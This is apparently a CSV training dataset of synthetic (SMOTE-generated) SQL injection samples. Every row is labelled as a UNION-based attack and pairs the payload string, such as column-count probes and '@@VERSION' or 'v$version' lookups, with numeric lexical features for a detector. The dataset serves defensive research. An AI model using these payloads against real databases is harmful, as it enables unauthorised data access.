id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000096,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000308,0.06420099183781694,68.37996334876397,27.0,4.084706825107369,25.0,20.303970679011172,16.0,7.075992669752792,0.36573346419840874,0.2967507532629896,0.2340694170869816,0.10344636545162009,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0759926697527922,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000097,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000246,0.2292862381908535,67.73529737129422,21.747059474258844,3.75906763060597,14.0,38.98823789703538,4.0,10.747059474258846,0.2069080246381071,0.5753570018214837,0.05911657846803059,0.15861839507237857,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.747059474258846,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000134,0.20665351779653432,98.20735787112038,25.0,3.994992310351195,63.7658862968963,3.5585284257759255,23.88294314844815,7.0,0.649202650215819,0.0363850347968242,0.2430892441434874,0.07132307084386938,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000099,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,0.931480461549259,100.1072745694491,24.775585468256626,3.786466904062142,25.0,44.0,18.66337820238494,12.443896367064157,0.25003153605905754,0.4400555034639413,0.18562958886995973,0.12428337160704145,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.443896367064157,0.0,0.0,7.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000100,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000169,0.26594381057082633,83.0,27.619820424227203,3.9220155481384347,40.0,4.0,26.0,13.0,0.4819277108433735,0.04819277108433734,0.3132530120481928,0.1566265060240964,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.619820424227203,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000101,attack,union,"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",nearest_attack_euclidean,R000341,0.37294119106634893,76.85069891018887,20.0,3.623570928854638,14.0,35.8805591281511,14.0,12.970139782037775,0.18294210963031093,0.46547728524743137,0.18294210963031093,0.1686384954919467,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.970139782037775,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000102,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000419,0.05724821837919722,40.0,20.0,4.125924767146768,14.0,16.0,4.0,6.0,0.35,0.4,0.1,0.15,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000004,0.8844440622252501,80.71255705429138,28.712557054291374,4.026880271663546,40.0,3.0,23.712557054291374,14.0,0.49560149966486805,0.03717011247486507,0.29376786297756297,0.1734605248827038,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.7125570542913746,0.0,0.9999999999999996,5.712557054291374,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000492,0.17240747274753734,108.68101287345863,26.0,3.915066087073778,25.0,52.0,16.583725320107398,15.097287553351233,0.23011068262186266,0.4786302198534743,0.1523467092267521,0.13891238829791094,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0972875533512332,0.0,0.0,9.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000103,1.041618508572652,87.0,30.768310667138046,3.966558324472189,42.0,4.371948222143661,29.0,11.62805177785634,0.4827586206896552,0.05025227841544436,0.3333333333333333,0.13365576756156713,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,0.9999999999999996,6.0,0.0,0.0,1.0,0.3719482221436594,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000106,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R000208,0.4207854066210943,67.66024294503548,22.489317136997634,3.8757142985422615,14.0,34.12819435602838,8.0,11.532048589007095,0.20950146639322295,0.5007121908668244,0.11971512365327026,0.17007121908668243,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,6.532048589007095,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,union,"-3279"" union all select 8568,8568,8568,8568--",nearest_attack_euclidean,R000189,0.20377236613793218,45.997694523325634,20.800461095334875,3.98490088599532,14.0,20.79815561866051,4.0,7.199538904665127,0.3049032340770849,0.45153916105476005,0.08711520973630997,0.15644239513184502,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1995389046651272,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000108,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,0.15706529914883344,68.8960900283007,21.77921800566014,3.9018457451656534,14.0,35.116872022640564,8.0,11.779218005660141,0.20339664606676705,0.5094333627617613,0.11622665489529546,0.17094333627617614,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.779218005660141,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000109,attack,union,"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",nearest_attack_euclidean,R000684,0.8347277523559298,72.06183342026942,26.46908328986529,3.9550770130432054,25.0,21.876333159461154,19.18550026080827,6.0,0.3469909636298021,0.3040199985018861,0.2657112065971592,0.08327783127115251,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.5309167101347114,0.0,0.0,1.4690832898652886,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000110,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000228,0.20282865928505814,63.55387445635478,21.14461255436452,3.9506935682250885,14.0,30.843099565083822,8.0,10.710774891270956,0.22104776436672255,0.48421747947611066,0.12631300820955574,0.16842174794761106,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.7107748912709555,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,0.050418203714120965,80.64008021468253,26.928016042936505,4.133255896697559,44.71206417174602,9.0,15.0,11.928016042936505,0.554222519313639,0.11171703667561864,0.18619506112603104,0.1478653828847113,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.928016042936506,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000112,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000222,0.25105737049538657,81.2645287658677,26.17354712341323,4.106792405114215,25.0,30.61162301269416,16.0,9.652905753173538,0.3083655357077583,0.3756890228661246,0.19735394285296531,0.11859149857315181,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.652905753173539,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000113,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000600,1.2218519472817175,71.0,22.0,3.8662437249238226,14.0,38.10801662378441,5.891983376215592,13.0,0.19718309859154928,0.5367326285040057,0.08298568135514918,0.18309859154929578,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.47299584405389783,1.0,0.0,7.527004155946102,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.47299584405389783,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,union," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",nearest_attack_euclidean,R000005,0.1162571209469732,69.81791633337592,32.817916333375926,4.467358809092541,40.0,2.0,15.0,12.817916333375926,0.5729365106966797,0.028646825534833997,0.21485119151125487,0.1835654722572314,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000115,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000702,0.49104002982421857,92.76396627651226,26.460661046085377,3.838877212246123,51.921322092170755,9.0,20.381983138256132,11.460661046085377,0.5605105044882494,0.0973616447806783,0.21873302618915164,0.12339482454192077,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.7303305230426886,0.0,0.0,5.730330523042689,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,0.22190653063567298,92.80965417091514,27.58731027806101,4.157173921984937,29.0,35.04772333673212,15.0,13.76193083418303,0.31451659800907417,0.37486032269118247,0.1626809989702108,0.14794208032953254,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.761930834183029,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000117,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000252,0.01686218150871673,58.882657610864186,21.988265761086417,3.931086157770048,14.0,31.90612608869135,4.0,8.976531522172838,0.23785637960840586,0.5417559307108736,0.06795896560240168,0.15242872407831884,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.976531522172838,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000118,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000016,0.0,83.0,29.0,3.9945533084585856,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000119,attack,union,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",nearest_attack_euclidean,R000547,0.71429162951733,104.07825146852144,28.410145710956545,3.926549055199403,25.0,46.35941715617382,19.539125734260722,13.179708578086908,0.24099533843629659,0.44579782460360506,0.18670606003281445,0.1265007769272839,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.589854289043454,0.0,0.0,7.589854289043454,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,0.09408483033102674,62.44389220142731,19.088778440285463,3.6140797464742196,14.0,24.35511376114185,14.0,10.088778440285463,0.22431042589793396,0.38983236407234934,0.22431042589793393,0.16154678413178275,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.088778440285463,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000029,0.6722804023025386,79.77678390687117,30.96130651145196,4.090828013534438,42.36904520916157,2.4077386977096076,24.0,11.0,0.5308189569546937,0.0303059934632377,0.3009428911419898,0.13793215844007867,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000122,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000351,0.0122135345494616,84.944965632237,29.0,4.291776298664394,37.024459719005776,19.932735772734112,17.0,10.987770140497112,0.43593116837813034,0.2345794470646532,0.20014482728358685,0.12934455727362965,3.0,0.0,2.993885070248556,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.9938850702485555,5.993885070248556,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000123,attack,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000068,0.34084451613715794,72.4859566120259,32.62148915300647,4.390366894033294,40.0,2.6214891530064754,17.242978306012947,12.621489153006474,0.5522319952739314,0.036010101831351615,0.23768980224488262,0.17406810064983447,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,4.621489153006474,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000676,0.5182473629824621,63.547756727938264,25.236517115195884,4.199357778299696,27.0,18.83820538235061,11.0,6.709551345587652,0.4287134596323704,0.29189515895422763,0.17466103910948425,0.10473034230391769,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7095513455876525,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000125,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,0.033647075395330864,91.15377946504026,25.0,3.8100718309598567,49.1892670338957,9.0,21.929024862289115,11.035487568855444,0.5394852183323685,0.09875485891955171,0.2407183130005731,0.1210416097475066,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.9881708103815188,0.0,0.0,5.047316758473925,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000069,0.4589826644643117,80.66048647504891,33.0,4.326048706648517,42.0,3.7767477458414866,20.88373872920743,14.0,0.5212226521257936,0.046702722923428475,0.2583337409088468,0.1737408840419312,3.0,0.0,2.0,0.0,1.0,1.7767477458414862,0.0,0.0,0.0,0.0,0.9999999999999996,6.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000127,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000009,0.05461090690597925,102.56441050055338,26.0,4.0692523601412995,65.41921400073785,4.145196499815537,24.0,9.0,0.6377599950523762,0.040456077425124914,0.23402467456181736,0.08775925296068152,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000128,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000015,0.006702070799501276,101.94644130085545,25.0,4.032498725248889,65.92858840114062,4.01785289971485,24.0,8.0,0.6466875511051577,0.03941723416196202,0.23542141104966025,0.07847380368322007,0.0,0.0,2.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
